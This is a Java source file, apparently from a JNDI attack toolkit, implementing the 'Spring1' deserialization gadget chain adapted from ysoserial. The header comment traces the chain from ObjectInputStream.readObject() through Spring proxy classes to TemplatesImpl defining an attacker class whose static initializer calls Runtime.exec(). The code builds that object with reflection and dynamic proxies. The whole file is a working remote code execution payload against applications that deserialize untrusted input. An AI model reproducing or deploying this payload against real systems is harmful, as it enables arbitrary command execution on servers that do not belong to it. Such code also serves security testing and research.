package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.annotation.Authors;
import com.nu1r.jndi.gadgets.annotation.Dependencies;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.JavaVersion;
import com.nu1r.jndi.gadgets.utils.Reflections;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;

import static java.lang.Class.forName;

/**
 * Gadget chain:
 *
 * 		ObjectInputStream.readObject()
 * 			SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
 * 				SerializableTypeWrapper.TypeProvider(Proxy).getType()
 * 					AnnotationInvocationHandler.invoke()
 * 						HashMap.get()
 * 				ReflectionUtils.findMethod()
 * 				SerializableTypeWrapper.TypeProvider(Proxy).getType()
 * 					AnnotationInvocationHandler.invoke()
 * 						HashMap.get()
 * 				ReflectionUtils.invokeMethod()
 * 					Method.invoke()
 * 						Templates(Proxy).newTransformer()
 * 							AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
 * 								ObjectFactory(Proxy).getObject()
 * 									AnnotationInvocationHandler.invoke()
 * 										HashMap.get()
 * 								Method.invoke()
 * 									TemplatesImpl.newTransformer()
 * 										TemplatesImpl.getTransletInstance()
 * 											TemplatesImpl.defineTransletClasses()
 * 												TemplatesImpl.TransletClassLoader.defineClass()
 * 													Pwner*(Javassist-generated).<static init>
 * 														Runtime.exec()
 */
@SuppressWarnings({"rawtypes","unused"})
@Dependencies({"org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-beans:4.1.4.RELEASE"})
@Authors({Authors.FROHOFF})
public class Spring1 implements ObjectPayload<Object>{
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(type,param);

        final ObjectFactory objectFactoryProxy =
                Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);

        final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)
                Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
                        .newInstance(objectFactoryProxy), Type.class, Templates.class);

        final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
                Gadgets.createMap("getType", typeTemplatesProxy),
                forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

        final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        final Object      mitp     = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[]{}), 0);
        Reflections.setFieldValue(mitp, "methodName", "newTransformer");

        return mitp;
    }


    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
